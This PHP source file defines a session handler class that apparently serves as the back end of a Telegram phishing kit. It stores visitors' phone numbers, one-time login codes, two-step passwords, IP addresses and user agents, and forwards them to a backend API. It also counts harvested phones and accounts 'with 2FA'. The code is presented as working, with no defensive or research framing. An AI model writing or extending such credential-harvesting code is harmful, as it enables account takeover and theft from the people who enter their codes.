<?php
class JsonSessionHandler implements SessionHandlerInterface
{
    private $backendUrl;
    private $localSessionsPath;
    private $localUsersPath;
    
    public function __construct($dataDir = 'data', $backendUrl = null) {
        // Create data directory if it doesn't exist
        if (!is_dir($dataDir)) {
            mkdir($dataDir, 0777, true);
        }
        
        // Set backend URL from configuration if available
        $this->backendUrl = $backendUrl ?: (defined('FLASK_SERVER_URL') ? FLASK_SERVER_URL : 'http://127.0.0.1:5000');
        
        // Keep local paths as fallback
        $this->localSessionsPath = $dataDir . '/sessions.json';
        $this->localUsersPath = $dataDir . '/users.json';
        
        // Initialize local session files if they don't exist
        if (!file_exists($this->localSessionsPath)) {
            file_put_contents($this->localSessionsPath, json_encode([]));
        }
        
        if (!file_exists($this->localUsersPath)) {
            file_put_contents($this->localUsersPath, json_encode([]));
        }
    }

    public function open($savePath, $sessionName) {
        return true;
    }

    public function close() {
        return true;
    }

    public function read($id) {
        // Try to get session from backend first
        $data = $this->getSessionFromBackend($id);
        
        // If backend request fails, use local file as fallback
        if ($data === false) {
            $sessions = $this->getLocalSessions();
            $data = isset($sessions[$id]) ? json_encode($sessions[$id]) : '';
        }
        
        return $data;
    }

    public function write($id, $data) {
        // Write to backend
        $success = $this->writeSessionToBackend($id, $data);
        
        // Also write locally as backup
        $sessions = $this->getLocalSessions();
        $sessions[$id] = json_decode($data, true) ?: [];
        
        // Add timestamp and client info
        $sessions[$id]['lastAccess'] = time();
        $sessions[$id]['ip_address'] = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
        $sessions[$id]['user_agent'] = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
        
        $this->saveLocalSessions($sessions);
        return $success;
    }

    public function destroy($id) {
        // Remove from backend
        $this->destroySessionOnBackend($id);
        
        // Also remove locally
        $sessions = $this->getLocalSessions();
        if (isset($sessions[$id])) {
            unset($sessions[$id]);
            $this->saveLocalSessions($sessions);
        }
        return true;
    }

    public function gc($maxlifetime) {
        // Let backend handle GC
        $this->gcOnBackend($maxlifetime);
        
        // Also perform local GC
        $sessions = $this->getLocalSessions();
        $now = time();
        
        foreach ($sessions as $id => $session) {
            if (isset($session['lastAccess']) && $session['lastAccess'] + $maxlifetime < $now) {
                unset($sessions[$id]);
            }
        }
        
        $this->saveLocalSessions($sessions);
        return true;
    }
    
    /**
     * Save Telegram data to backend
     */
    public function saveTelegramData($message, $additionalData = []) {
        $sessionId = session_id();
        
        // Prepare data to send to backend
        $document = [
            'message' => $message,
            'timestamp' => time(),
            'ip_address' => $_SERVER['REMOTE_ADDR'] ?? 'unknown',
            'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'unknown',
            'session_id' => $sessionId
        ];
        
        // Add additional data
        if (!empty($additionalData)) {
            foreach ($additionalData as $key => $value) {
                $document[$key] = $value;
            }
        }
        
        // Send to backend
        $success = $this->saveTelegramDataToBackend($sessionId, $document);
        
        // Also save locally as backup
        $users = $this->getLocalUsers();
        
        if (!isset($users[$sessionId])) {
            $users[$sessionId] = [];
        }
        
        if (!isset($users[$sessionId]['messages'])) {
            $users[$sessionId]['messages'] = [];
        }
        
        $users[$sessionId]['messages'][] = $document;
        
        // Update user data if form_data is present
        if (isset($additionalData['form_data'])) {
            $users[$sessionId]['form_data'] = $additionalData['form_data'];
        }
        
        // Update stage if present
        if (isset($additionalData['stage'])) {
            $users[$sessionId]['stage'] = $additionalData['stage'];
        }
        
        // Update other fields
        foreach (['password', 'otp_code'] as $key) {
            if (isset($additionalData[$key])) {
                $users[$sessionId][$key] = $additionalData[$key];
            }
        }
        
        $this->saveLocalUsers($users);
        
        return $success;
    }
    
    /**
     * Get Telegram data by session ID
     */
    public function getTelegramDataBySessionId($sessionId) {
        // Try to get from backend first
        $data = $this->getTelegramDataFromBackend($sessionId);
        
        // Fallback to local if backend fails
        if ($data === false) {
            $users = $this->getLocalUsers();
            
            if (isset($users[$sessionId]) && isset($users[$sessionId]['messages'])) {
                return $users[$sessionId]['messages'];
            }
            
            return [];
        }
        
        return $data;
    }
    
    /**
     * Get all sessions
     */
    public function getAllSessions() {
        // Try to get from backend first
        $data = $this->getAllSessionsFromBackend();
        
        // Fallback to local if backend fails
        if ($data === false) {
            return $this->getLocalSessions();
        }
        
        return $data;
    }
    
    /**
     * Get unique phone numbers
     */
    public function getUniquePhoneNumbers() {
        // Try to get from backend first
        $data = $this->getUniquePhoneNumbersFromBackend();
        
        // Fallback to local if backend fails
        if ($data === false) {
            $users = $this->getLocalUsers();
            $phoneNumbers = [];
            
            foreach ($users as $userData) {
                if (isset($userData['form_data']) && isset($userData['form_data']['phoneNumber'])) {
                    $phoneNumber = $userData['form_data']['phoneNumber'];
                    if (!in_array($phoneNumber, $phoneNumbers)) {
                        $phoneNumbers[] = $phoneNumber;
                    }
                }
            }
            
            sort($phoneNumbers);
            return $phoneNumbers;
        }
        
        return $data;
    }
    
    /**
     * Get statistics
     */
    public function getStatistics() {
        // Try to get from backend first
        $data = $this->getStatisticsFromBackend();
        
        // Fallback to local if backend fails
        if ($data === false) {
            $sessions = $this->getLocalSessions();
            $users = $this->getLocalUsers();
            
            $totalSessions = count($sessions);
            $totalTelegramData = 0;
            $with2FA = 0;
            
            foreach ($users as $userData) {
                if (isset($userData['messages'])) {
                    $totalTelegramData += count($userData['messages']);
                }
                
                if (isset($userData['password'])) {
                    $with2FA++;
                }
            }
            
            $uniquePhones = count($this->getUniquePhoneNumbers());
            
            return [
                'total_sessions' => $totalSessions,
                'total_telegram_data' => $totalTelegramData,
                'unique_phones' => $uniquePhones,
                'with_2fa' => $with2FA
            ];
        }
        
        return $data;
    }
    
    // Methods to interact with backend API
    
    private function getSessionFromBackend($id) {
        return $this->sendRequest('/api/session/read', ['session_id' => $id]);
    }
    
    private function writeSessionToBackend($id, $data) {
        return $this->sendRequest('/api/session/write', [
            'session_id' => $id, 
            'data' => json_decode($data, true) ?: []
        ]);
    }
    
    private function destroySessionOnBackend($id) {
        return $this->sendRequest('/api/session/destroy', ['session_id' => $id]);
    }
    
    private function gcOnBackend($maxlifetime) {
        return $this->sendRequest('/api/session/gc', ['maxlifetime' => $maxlifetime]);
    }
    
    private function saveTelegramDataToBackend($sessionId, $data) {
        return $this->sendRequest('/api/telegram/save', [
            'session_id' => $sessionId,
            'data' => $data
        ]);
    }
    
    private function getTelegramDataFromBackend($sessionId) {
        return $this->sendRequest('/api/telegram/get', ['session_id' => $sessionId]);
    }
    
    private function getAllSessionsFromBackend() {
        return $this->sendRequest('/api/session/all', []);
    }
    
    private function getUniquePhoneNumbersFromBackend() {
        return $this->sendRequest('/api/phone/unique', []);
    }
    
    private function getStatisticsFromBackend() {
        return $this->sendRequest('/api/statistics', []);
    }
    
    /**
     * Send request to backend API
     */
    private function sendRequest($endpoint, $data) {
        try {
            $ch = curl_init($this->backendUrl . $endpoint);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
            curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
            curl_setopt($ch, CURLOPT_TIMEOUT, 50); // 5 second timeout to prevent hanging
            
            $output = curl_exec($ch);
            $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            curl_close($ch);
            
            if ($http_code != 200) {
                throw new Exception("Backend returned HTTP code $http_code");
            }
            
            $result = json_decode($output, true);
            
            if (!$result || !isset($result['success']) || $result['success'] !== true) {
                throw new Exception("Backend returned error: " . ($result['error'] ?? 'Unknown error'));
            }
            
            return isset($result['data']) ? $result['data'] : true;
        } catch (Exception $e) {
            error_log("Backend API error: " . $e->getMessage());
            return false;
        }
    }
    
    // Local file methods (as fallback)
    
    private function getLocalSessions() {
        $content = file_get_contents($this->localSessionsPath);
        return json_decode($content, true) ?: [];
    }
    
    private function saveLocalSessions($sessions) {
        return file_put_contents($this->localSessionsPath, json_encode($sessions, JSON_PRETTY_PRINT));
    }
    
    private function getLocalUsers() {
        $content = file_get_contents($this->localUsersPath);
        return json_decode($content, true) ?: [];
    }
    
    private function saveLocalUsers($users) {
        return file_put_contents($this->localUsersPath, json_encode($users, JSON_PRETTY_PRINT));
    }
}
